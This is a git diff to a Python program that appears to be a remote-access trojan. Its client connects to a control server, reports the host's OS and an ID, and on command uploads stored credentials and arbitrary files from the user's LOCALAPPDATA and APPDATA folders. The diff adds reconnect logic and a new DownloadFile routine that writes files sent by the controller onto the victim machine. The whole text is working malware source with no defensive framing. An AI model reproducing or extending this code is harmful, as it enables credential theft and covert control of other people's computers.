@@ -7,7 +7,7 @@ import multiprocessing
 import time
 import sys
 
-control_address = ("server address", "SERVER_PORT")
+control_address = ("localhost", 8080)
 
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
@@ -51,8 +51,11 @@ def Start_Client():
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(control_address)
-
+            try:
+                sock.connect(control_address)
+            except ConnectionRefusedError:
+                time.sleep(2)
+                Start_Client()
             # Giving the client an ID for easy management
             filed = []
             for root, dirs, files in os.walk("."):
@@ -70,15 +73,16 @@ def Start_Client():
                 CID = open(".CID", "r").read()
 
             time.sleep(1)
-            sock.send(f"Got heartbeat from {CheckOS()} system with ID {CID}".encode())
+            sock.send(f"heartbeat from {CheckOS()} system with {CID}".encode())
             # sock.close()
         except Exception as E:
             print(E)
             sys.exit(1)
 
-        command = sock.recv(4096).decode("utf-8")
-        if command.__contains__(CID):
-            if command.__contains__("creds"):
+        command = sock.recv(4096)
+        if command.__contains__(CID.encode()):
+            if command.__contains__(b"creds"):
+                command = command.decode("utf-8")
                 if command.__contains__("full"):
                     mode = 1
                 else:
@@ -99,9 +103,16 @@ def Start_Client():
                     UploadFile(t, sock)
                 else:
                     sock.send("Invaild operation...".encode())
-            if command.__contains__("download"):
+                continue
+            if command.__contains__(b"download"):
+                command = command.decode("utf-8")
                 filepath = command.split(" ")[3]
                 UploadFile(filepath, sock)
+                continue
+            if command.__contains__(b"file_accept"):
+                filename = command.split(b" ")[3]
+                DownloadFile(filename, sock)
+                continue
 
         # sock.sendall(cred)
         # print(cred)
@@ -189,8 +200,18 @@ def UploadFile(files, sock):
             sock.send(str(E).encode())
 
 
-def DownloadFile():
-    pass
+def DownloadFile(filename, sock):
+    file = open(filename.decode("utf-8").replace("/", ""), "wb")
+    buffer = b""
+    while True:
+        data = sock.recv(4096)
+        if len(data) < 4096:
+            buffer += data
+            file.write(buffer)
+            file.close()
+            break
+        buffer += data
+    sock.send(f"file {filename} uploaded".encode())
 
 
 def Run():
